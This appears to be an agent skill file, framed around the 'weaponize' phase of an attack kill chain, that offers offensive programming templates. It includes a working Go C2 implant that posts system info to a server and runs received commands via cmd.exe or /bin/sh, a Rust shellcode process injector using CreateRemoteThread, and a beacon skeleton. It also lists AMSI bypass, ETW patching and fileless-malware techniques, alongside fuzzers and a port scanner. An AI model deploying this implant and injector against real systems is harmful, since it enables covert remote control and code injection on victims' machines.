---
name: coding-mastery
description: Advanced software engineering — systems programming, exploit development tooling, automation scripting, network programming, cryptography implementation
metadata:
  type: utility
  phase: any
kill_chain:
  phase: [weaponize]
  step: [2]
  attck_tactics: [TA0042]
depends_on: []
feeds_into: [exploit-development, shellcode-dev, edr-evasion]
inputs: [tool_requirements]
outputs: [custom_tooling, exploit_code]
---

# Coding Mastery

## When to Activate

- Writing exploit code, PoCs, or security tools
- Developing automation scripts for pentesting workflows
- Implementing network protocols or custom C2
- Building security analysis tools
- Cryptographic implementation or analysis
- Performance-critical systems programming

## Languages & Use Cases

### Python (Primary — Offensive Tooling)
```python
# Exploit development with pwntools
from pwn import *
context(arch='amd64', os='linux')

# Network programming
import socket, ssl, struct
import asyncio, aiohttp  # async operations

# Web exploitation
import requests, urllib3
from bs4 import BeautifulSoup

# Crypto
from Crypto.Cipher import AES, DES
from Crypto.PublicKey import RSA
import hashlib, hmac

# Binary analysis
import struct, ctypes
from capstone import *  # disassembly
from unicorn import *   # emulation
from keystone import *  # assembly
```

### C/C++ (Systems & Exploit Dev)
```c
// Shellcode development
// Position-independent code, null-free
// Syscall-based (avoid libc dependency)

// Kernel module development
#include <linux/module.h>
#include <linux/kernel.h>

// Windows API abuse
#include <windows.h>
#include <winternl.h>
// Direct syscalls, NTAPI

// Memory manipulation
// Custom allocators, heap spray, ROP gadget finders
```

### Go (Offensive Tooling & C2)
```go
// Implant development (cross-compile, static binary)
// C2 communication (HTTP/DNS/named pipes)
// Network scanning and enumeration
// Proxy/tunnel tools (chisel-like)

// Advantages: single binary, cross-platform, fast, good crypto stdlib
```

### Rust (High-Performance Security Tools)
```rust
// Memory-safe exploit tooling
// High-performance scanners
// Custom protocol implementations
// Fuzzing harnesses
```

### PowerShell (Windows Post-Exploitation)
```powershell
# AMSI bypass, ETW patching
# In-memory execution (reflection)
# AD enumeration and exploitation
# Fileless malware techniques
```

### Assembly (x86/x64/ARM)
```nasm
; Shellcode
; ROP gadgets
; Anti-debugging
; Kernel exploitation
; Architecture-specific tricks
```

## Design Patterns for Security Tools

### Scanner Architecture
```python
import asyncio
from dataclasses import dataclass
from typing import AsyncIterator

@dataclass
class Finding:
    severity: str
    target: str
    vulnerability: str
    evidence: str

class Scanner:
    def __init__(self, targets: list[str], concurrency: int = 50):
        self.targets = targets
        self.semaphore = asyncio.Semaphore(concurrency)
    
    async def scan_target(self, target: str) -> list[Finding]:
        async with self.semaphore:
            # Implement scan logic
            pass
    
    async def run(self) -> AsyncIterator[Finding]:
        tasks = [self.scan_target(t) for t in self.targets]
        for coro in asyncio.as_completed(tasks):
            findings = await coro
            for f in findings:
                yield f
```

### C2 Communication Pattern
```python
import base64, json, time, random
from cryptography.fernet import Fernet

class Beacon:
    def __init__(self, server: str, key: bytes, jitter: float = 0.3):
        self.server = server
        self.cipher = Fernet(key)
        self.jitter = jitter
        self.sleep_time = 60
    
    def encrypt(self, data: bytes) -> str:
        return base64.b64encode(self.cipher.encrypt(data)).decode()
    
    def decrypt(self, data: str) -> bytes:
        return self.cipher.decrypt(base64.b64decode(data))
    
    def sleep(self):
        jitter = random.uniform(1 - self.jitter, 1 + self.jitter)
        time.sleep(self.sleep_time * jitter)
    
    def checkin(self) -> dict:
        # POST encrypted system info, receive tasking
        pass
```

### Network Protocol Implementation
```python
import struct

class ProtocolParser:
    def __init__(self, data: bytes):
        self.data = data
        self.offset = 0
    
    def read_u8(self) -> int:
        val = struct.unpack_from('B', self.data, self.offset)[0]
        self.offset += 1
        return val
    
    def read_u16(self) -> int:
        val = struct.unpack_from('>H', self.data, self.offset)[0]
        self.offset += 2
        return val
    
    def read_u32(self) -> int:
        val = struct.unpack_from('>I', self.data, self.offset)[0]
        self.offset += 4
        return val
    
    def read_bytes(self, n: int) -> bytes:
        val = self.data[self.offset:self.offset + n]
        self.offset += n
        return val
    
    def read_string(self) -> str:
        length = self.read_u16()
        return self.read_bytes(length).decode()
```

## Cryptography Patterns

```python
# AES-GCM (authenticated encryption)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

key = AESGCM.generate_key(bit_length=256)
aes = AESGCM(key)
nonce = os.urandom(12)
ct = aes.encrypt(nonce, plaintext, associated_data)
pt = aes.decrypt(nonce, ct, associated_data)

# RSA key generation and usage
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

private_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
public_key = private_key.public_key()

# Encrypt
ct = public_key.encrypt(plaintext, padding.OAEP(
    mgf=padding.MGF1(algorithm=hashes.SHA256()),
    algorithm=hashes.SHA256(), label=None))

# HMAC for integrity
import hmac, hashlib
mac = hmac.new(key, message, hashlib.sha256).digest()

# Key derivation
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=600000)
key = kdf.derive(password)
```

## Advanced: Exploit Development Patterns

### Custom Fuzzer Architecture
```python
import os, signal, subprocess, struct, random
from multiprocessing import Pool

class CoverageFuzzer:
    def __init__(self, target_binary, corpus_dir, crashes_dir):
        self.target = target_binary
        self.corpus = self._load_corpus(corpus_dir)
        self.crashes_dir = crashes_dir
        self.coverage = set()
    
    def mutate(self, data: bytes) -> bytes:
        mutations = [
            self._bit_flip,
            self._byte_flip,
            self._insert_interesting,
            self._splice,
            self._havoc,
        ]
        mutator = random.choice(mutations)
        return mutator(data)
    
    def _bit_flip(self, data: bytes) -> bytes:
        d = bytearray(data)
        pos = random.randint(0, len(d) * 8 - 1)
        d[pos // 8] ^= (1 << (pos % 8))
        return bytes(d)
    
    def _insert_interesting(self, data: bytes) -> bytes:
        interesting = [0, 1, 0x7f, 0x80, 0xff, 0xffff, 0x7fffffff, 0x80000000, 0xffffffff]
        d = bytearray(data)
        pos = random.randint(0, len(d) - 4)
        val = random.choice(interesting)
        struct.pack_into('<I', d, pos, val & 0xffffffff)
        return bytes(d)
    
    def run_target(self, input_data: bytes) -> tuple:
        """Returns (exit_code, new_coverage)"""
        proc = subprocess.run(
            [self.target], input=input_data, capture_output=True,
            timeout=5, env={**os.environ, 'ASAN_OPTIONS': 'detect_leaks=0'}
        )
        if proc.returncode < 0:  # Signal = crash
            return (proc.returncode, True)
        return (proc.returncode, False)

    def fuzz_loop(self, iterations=100000):
        for i in range(iterations):
            seed = random.choice(self.corpus)
            mutated = self.mutate(seed)
            code, crashed = self.run_target(mutated)
            if crashed:
                crash_path = f"{self.crashes_dir}/crash_{i:06d}"
                open(crash_path, 'wb').write(mutated)
```

### C2 Implant Architecture (Go)
```go
package main

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "encoding/json"
    "io"
    "net/http"
    "os/exec"
    "runtime"
    "time"
)

type Beacon struct {
    Server    string
    Key       []byte
    Sleep     time.Duration
    Jitter    float64
    KillDate  time.Time
}

type Task struct {
    ID      string `json:"id"`
    Command string `json:"cmd"`
    Args    string `json:"args"`
}

type Result struct {
    TaskID string `json:"task_id"`
    Output string `json:"output"`
    Error  string `json:"error,omitempty"`
}

func (b *Beacon) Encrypt(data []byte) ([]byte, error) {
    block, _ := aes.NewCipher(b.Key)
    gcm, _ := cipher.NewGCM(block)
    nonce := make([]byte, gcm.NonceSize())
    io.ReadFull(rand.Reader, nonce)
    return gcm.Seal(nonce, nonce, data, nil), nil
}

func (b *Beacon) Decrypt(data []byte) ([]byte, error) {
    block, _ := aes.NewCipher(b.Key)
    gcm, _ := cipher.NewGCM(block)
    nonceSize := gcm.NonceSize()
    return gcm.Open(nil, data[:nonceSize], data[nonceSize:], nil)
}

func (b *Beacon) CheckIn() (*Task, error) {
    sysinfo := map[string]string{
        "os": runtime.GOOS, "arch": runtime.GOARCH,
    }
    body, _ := json.Marshal(sysinfo)
    enc, _ := b.Encrypt(body)
    
    resp, err := http.Post(b.Server+"/api/beacon",
        "application/octet-stream",
        bytes.NewReader(enc))
    if err != nil { return nil, err }
    defer resp.Body.Close()
    
    respBody, _ := io.ReadAll(resp.Body)
    dec, _ := b.Decrypt(respBody)
    var task Task
    json.Unmarshal(dec, &task)
    return &task, nil
}

func (b *Beacon) Execute(task *Task) *Result {
    var cmd *exec.Cmd
    switch runtime.GOOS {
    case "windows":
        cmd = exec.Command("cmd.exe", "/c", task.Args)
    default:
        cmd = exec.Command("/bin/sh", "-c", task.Args)
    }
    output, err := cmd.CombinedOutput()
    result := &Result{TaskID: task.ID, Output: base64.StdEncoding.EncodeToString(output)}
    if err != nil { result.Error = err.Error() }
    return result
}
```

### Network Protocol Fuzzer
```python
import socket, struct, random, itertools
from dataclasses import dataclass, field

@dataclass
class ProtocolField:
    name: str
    fmt: str  # struct format
    value: int = 0
    fuzzable: bool = True
    
    @property
    def size(self): return struct.calcsize(self.fmt)
    
    def pack(self): return struct.pack(self.fmt, self.value)
    
    def fuzz(self):
        boundaries = [0, 1, self.max_val - 1, self.max_val, self.max_val // 2]
        return random.choice(boundaries + [random.randint(0, self.max_val)])
    
    @property
    def max_val(self): return (1 << (self.size * 8)) - 1

class ProtocolFuzzer:
    def __init__(self, host, port, fields: list[ProtocolField]):
        self.host, self.port = host, port
        self.fields = fields
    
    def build_packet(self, fuzz_field=None) -> bytes:
        pkt = b''
        for f in self.fields:
            if f.name == fuzz_field and f.fuzzable:
                pkt += struct.pack(f.fmt, f.fuzz())
            else:
                pkt += f.pack()
        return pkt
    
    def send(self, packet: bytes) -> bytes:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((self.host, self.port))
        s.send(packet)
        try: resp = s.recv(4096)
        except: resp = b''
        s.close()
        return resp
    
    def fuzz_all_fields(self, iterations=1000):
        for i in range(iterations):
            field = random.choice([f for f in self.fields if f.fuzzable])
            pkt = self.build_packet(fuzz_field=field.name)
            try:
                resp = self.send(pkt)
                if not resp:
                    print(f"[!] No response fuzzing {field.name} iter {i}")
            except ConnectionRefusedError:
                print(f"[!!!] CRASH fuzzing {field.name} iter {i}")
                open(f"crash_{i}.bin", 'wb').write(pkt)
```

### Windows API Wrapper (Rust — Safe Offensive Tooling)
```rust
use std::ptr;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::Foundation::*;

pub struct ProcessInjector {
    pid: u32,
    handle: HANDLE,
}

impl ProcessInjector {
    pub fn open(pid: u32) -> Result<Self, u32> {
        let handle = unsafe {
            OpenProcess(PROCESS_ALL_ACCESS, 0, pid)
        };
        if handle == 0 { return Err(unsafe { GetLastError() }); }
        Ok(Self { pid, handle })
    }
    
    pub fn inject(&self, shellcode: &[u8]) -> Result<HANDLE, u32> {
        let base = unsafe {
            VirtualAllocEx(self.handle, ptr::null(), shellcode.len(),
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        };
        if base.is_null() { return Err(unsafe { GetLastError() }); }
        
        let mut written = 0;
        unsafe {
            WriteProcessMemory(self.handle, base, shellcode.as_ptr() as _,
                shellcode.len(), &mut written);
            
            let mut old = 0u32;
            VirtualProtectEx(self.handle, base, shellcode.len(),
                PAGE_EXECUTE_READ, &mut old);
            
            let thread = CreateRemoteThread(self.handle, ptr::null(),
                0, Some(std::mem::transmute(base)), ptr::null(), 0, ptr::null_mut());
            
            if thread == 0 { return Err(GetLastError()); }
            Ok(thread)
        }
    }
}

impl Drop for ProcessInjector {
    fn drop(&mut self) {
        unsafe { CloseHandle(self.handle); }
    }
}
```

### Async Port Scanner
```python
import asyncio, socket, struct
from typing import AsyncIterator

async def scan_port(host: str, port: int, timeout: float = 1.0) -> int | None:
    try:
        _, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=timeout)
        writer.close()
        await writer.wait_closed()
        return port
    except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
        return None

async def scan_host(host: str, ports: range, concurrency: int = 500) -> AsyncIterator[int]:
    sem = asyncio.Semaphore(concurrency)
    async def _scan(port):
        async with sem:
            return await scan_port(host, port)
    
    tasks = [asyncio.create_task(_scan(p)) for p in ports]
    for task in asyncio.as_completed(tasks):
        result = await task
        if result:
            yield result

async def service_detect(host: str, port: int) -> str:
    """Grab banner for service identification"""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=2.0)
        # Send probe
        writer.write(b'\r\n')
        await writer.drain()
        banner = await asyncio.wait_for(reader.read(1024), timeout=2.0)
        writer.close()
        return banner.decode(errors='ignore').strip()
    except:
        return ""
```
